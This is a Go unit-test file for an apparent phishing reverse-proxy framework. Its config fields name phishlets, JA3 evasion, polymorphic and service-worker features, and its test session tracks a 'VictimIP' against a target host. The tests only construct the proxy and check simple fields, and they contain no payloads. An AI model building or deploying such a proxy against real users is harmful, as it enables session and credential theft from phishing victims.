package proxy

import (
	"context"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/phantom-proxy/phantom-proxy/internal/config"
	"github.com/phantom-proxy/phantom-proxy/internal/database"
	"go.uber.org/zap"
)

func TestNewHTTPProxy(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:         "test.local",
		HTTPSPort:      8443,
		BindIP:         "0.0.0.0",
		CertPath:       "./certs/cert.pem",
		KeyPath:        "./certs/key.pem",
		DatabasePath:   ":memory:",
		PhishletsPath:  "./configs/phishlets",
		JA3Enabled:     false,
		PolymorphicEnabled: false,
		ServiceWorkerEnabled: false,
		WebSocketEnabled: false,
		MLDetection:    false,
	}

	db, err := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	if err != nil {
		t.Fatalf("Failed to create database: %v", err)
	}
	defer db.Close()

	proxy, err := NewHTTPProxy(cfg, db, logger)
	if err != nil {
		t.Fatalf("Failed to create HTTP proxy: %v", err)
	}
	defer proxy.Close()

	if proxy == nil {
		t.Fatal("Expected proxy to be created")
	}
}

func TestProxySession(t *testing.T) {
	logger, _ := zap.NewDevelopment()
	defer logger.Sync()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
	}

	db, _ := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	defer db.Close()

	proxy, _ := NewHTTPProxy(cfg, db, logger)
	defer proxy.Close()

	// Create test session
	session := &ProxySession{
		ID:         "test-session-1",
		VictimIP:   "192.168.1.1",
		TargetHost: "example.com",
		CreatedAt:  time.Now(),
		LastActive: time.Now(),
	}

	// Test session methods
	if session.ID != "test-session-1" {
		t.Errorf("Expected session ID to be test-session-1, got %s", session.ID)
	}

	if session.VictimIP != "192.168.1.1" {
		t.Errorf("Expected victim IP to be 192.168.1.1, got %s", session.VictimIP)
	}
}

func TestProxyReverseProxy(t *testing.T) {
	logger, _ := zap.NewDevelopment()

	// Create test target server
	target := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
		w.Write([]byte("OK"))
	}))
	defer target.Close()

	cfg := &config.Config{
		Domain:       "test.local",
		HTTPSPort:    8443,
		BindIP:       "0.0.0.0",
		DatabasePath: ":memory:",
	}

	db, _ := database.NewDatabase(&database.DatabaseConfig{
		Type:       database.DatabaseSQLite,
		SQLitePath: ":memory:",
	}, logger)
	defer db.Close()

	proxy, _ := NewHTTPProxy(cfg, db, logger)
	defer proxy.Close()

	// Test that proxy can handle requests
	ctx := context.Background()
	req := httptest.NewRequest("GET", "http://test.local/test", nil)
	req = req.WithContext(ctx)

	w := httptest.NewRecorder()

	// Proxy should handle the request without panicking
	proxy.ServeHTTP(w, req)

	// We expect either OK or error depending on proxy configuration
	// Main test is that it doesn't crash
}
